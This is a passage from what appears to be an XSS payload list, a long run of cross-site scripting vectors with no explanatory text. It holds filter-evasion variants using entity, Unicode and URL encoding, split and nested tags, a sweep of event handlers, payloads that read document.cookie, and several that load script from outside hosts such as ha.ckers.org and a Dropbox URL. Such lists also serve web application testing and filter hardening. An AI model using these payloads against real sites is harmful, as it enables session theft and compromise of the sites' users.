type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;XSS STYLE=\"xss:expression(alert('XSS'))\"&gt;\n&lt;XSS STYLE=\"behavior: url(xss.htc);\"&gt;\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;\n&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"&gt;\n&lt;DIV STYLE=\"background-image: url(&amp;#1;javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;\n&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;\n&lt;BASE HREF=\"javascript:alert('XSS');//\"&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"&gt;&lt;/OBJECT&gt;\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;\n&lt;IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"&gt;\n&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;\n&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n&lt;SCRIPT a=\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT =\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;\" '' SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT \"a='&gt;'\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=`&gt;` SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;A HREF=\"http://66.102.7.147/\"&gt;XSS&lt;/A&gt;\n0\\\"autofocus/onfocus=alert(1)--&gt;&lt;video/poster/ error=prompt(2)&gt;\"-confirm(3)-\"\nveris--&gt;group&lt;svg/onload=alert(/XSS/)//\n#\"&gt;&lt;img src=M onerror=alert('XSS');&gt;\nelement[attribute='&lt;img src=x onerror=alert('XSS');&gt;\n[&lt;blockquote cite=\"]\"&gt;[\" onmouseover=\"alert('RVRSH3LL_XSS');\" ]\n%22;alert%28%27RVRSH3LL_XSS%29//\njavascript:alert%281%29;\n&lt;w contenteditable id=x onfocus=alert()&gt;\nalert;pg(\"XSS\")\n&lt;svg/onload=%26%23097lert%26lpar;1337)&gt;\n&lt;script&gt;for((i)in(self))eval(i)(1)&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;\n&lt;sCR&lt;script&gt;iPt&gt;alert(1)&lt;/SCr&lt;/script&gt;IPt&gt;\n&lt;a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"&gt;test&lt;/a&gt;\n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n&lt;IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmessage=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ononline=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onoffline=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onpagehide=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onpageshow=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onpopstate=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onresize=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onstorage=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onunload=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onblur=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncontextmenu=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oninput=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oninvalid=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onreset=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onsearch=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onselect=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onsubmit=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onkeypress=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onkeyup=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onclick=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondblclick=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmousedown=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmousemove=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmouseout=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmouseup=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onmousewheel=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onwheel=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondragend=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondragenter=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onabort=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncanplay=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncanplaythrough=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ondurationchange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onemptied=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onloadedmetadata=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onloadstart=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onpause=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onplay=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onplaying=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onratechange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onseeked=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onseeking=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onstalled=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onsuspend=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onvolumechange=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onwaiting=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x onshow=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;IMG SRC=x ontoggle=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=\"alert(1)\";\n&lt;IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"&gt;\n&lt;INPUT TYPE=\"BUTTON\" action=\"alert('XSS')\"/&gt;\n\"&gt;&lt;h1&gt;&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\"&gt;123&lt;/h1&gt;\n\"&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;123&lt;/h1&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n\"&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;123&lt;/h1&gt;\n\"&gt;&lt;/iframe&gt;&lt;script&gt;alert(`TEXT YOU WANT TO BE DISPLAYED`);&lt;/script&gt;&lt;iframe frameborder=\"0%EF%BB%BF\n\"&gt;&lt;h1&gt;&lt;IFRAME width=\"420\" height=\"315\" SRC=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;123&lt;/h1&gt;\n\"&gt;&lt;h1&gt;&lt;iframe width=\"420\" height=\"315\" src=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;123&lt;/h1&gt;\n&gt;&lt;h1&gt;&lt;IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onmouseover=\"document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr\ng'\"&gt;&lt;/IFRAME&gt;Hover the cursor to the LEFT of this Message&lt;/h1&gt;&amp;ParamHeight=250\n&lt;IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onload=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n\"&gt;&lt;h1&gt;&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\"&gt;123&lt;/h1&gt;\n\"&gt;&lt;h1&gt;&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;123&lt;/h1&gt;\n&lt;iframe src=http://xss.rocks/scriptlet.html &lt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n&lt;iframe  src=\"&amp;Tab;javascript:prompt(1)&amp;Tab;\"&gt;\n&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'\n&lt;input/onmouseover=\"javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;\"\n&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; {Opera}\n&lt;img/src=`` onerror=this.onerror=confirm(1) \n&lt;form&gt;&lt;isindex formaction=\"javascript&amp;colon;confirm(1)\"\n&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;\n&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;\n&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?\n&lt;iframe/src=\"data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;\n&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/\n&amp;#34;&amp;#62;&lt;h1/onmouseover='\\u0061lert(1)'&gt;\n&lt;iframe/src=\"data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;\"&gt;\n&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)\" http-equiv=\"refresh\"/&gt;\n&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/') &lt;/script\n&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"&gt;\n&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;\n&lt;form&gt;&lt;a href=\"javascript:\\u0061lert&amp;#x28;1&amp;#x29;\"&gt;X&lt;/script&gt;&lt;img/*/src=\"worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;\"/*/onerror='eval(src)'&gt;\n&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;\n&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=\"javascript&amp;#58;alert(1)\"&amp;#11;&amp;#10;&amp;#09;;&gt;\n&lt;a href=\"data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a\nhttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script\n&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;\"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;\"&gt;XYZ&lt;/a\n&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')\n&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;\n&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^\n&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(\n&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;\"date\" onfocus=\"alert(1)\"&gt;\n&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;'&gt;\n&lt;script /***/&gt;/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/&lt;/script /***/\n&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;\n&lt;a href=\"javascript:void(0)\" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;\n&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;\n&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;\n&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN\n&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)\n&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'\n&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}\n&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^\n&lt;div/style=\"width:expression(confirm(1))\"&gt;X&lt;/div&gt; {IE7}\n&lt;iframe// src=javaSCRIPT&amp;colon;alert(1)\n//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//\n/*iframe/src*/&lt;iframe/src=\"&lt;iframe/src=@\"/onload=prompt(1) /*iframe/src*/&gt;\n//|\\\\ &lt;script //|\\\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\\\ &lt;/script //|\\\\\n&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;\n&lt;a/href=\"javascript:&amp;#13; javascript:prompt(1)\"&gt;&lt;input type=\"X\"&gt;\n&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)\n&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}\n&lt;a href=\"javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;\"&gt;&lt;button&gt;\n&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;\n&lt;iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"&gt;\n&lt;a href=\"jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;\"&gt;X&lt;/a&gt;\n&lt;embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;var onmouseover=\"prompt(1)\"&gt;On Mouse Over&lt;/var&gt;\n&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;\n&lt;img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"&gt;\n&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;\n&lt;script src=\"data:text/javascript,alert(1)\"&gt;&lt;/script&gt;\n&lt;iframe/src \\/\\/onload = prompt(1)\n&lt;iframe/onreadystatechange=alert(1)\n&lt;svg/onload=alert(1)\n&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)\n&lt;input type=\"text\" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;\nhttp://www.&lt;script&gt;alert(1)&lt;/script .com\n&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;svg&gt;&lt;script ?&gt;alert(1)\n&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;img src=`xx:xx`onerror=alert(1)&gt;\n&lt;object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"&gt;&lt;/object&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;javascript&amp;colon;alert(1)\"/&gt;\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always&gt;\n&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1\n&lt;a href=\"data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\"&gt;X&lt;/a\n&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE&gt;\n&lt;script&gt;~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')&lt;/script U+\n&lt;script/src=\"data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"&gt;&lt;/script a=\\u0061 &amp; /=%2F\n&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script\n&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\n&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;\n&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;\n&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script\n&lt;img src ?itworksonchrome?\\/onerror = alert(1)\n&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;\n&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)\n&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe\n&lt;script x&gt; alert(1) &lt;/script 1=2\n&lt;div/onmouseover='alert(1)'&gt; style=\"x:\"&gt;\n&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;\n&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;\n&lt;div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\"&gt;x&lt;/button&gt;\n\"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;\n&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;\n&lt;iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"&gt;&lt;/iframe&gt;\n&lt;a href=\"data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203\"&gt;Click 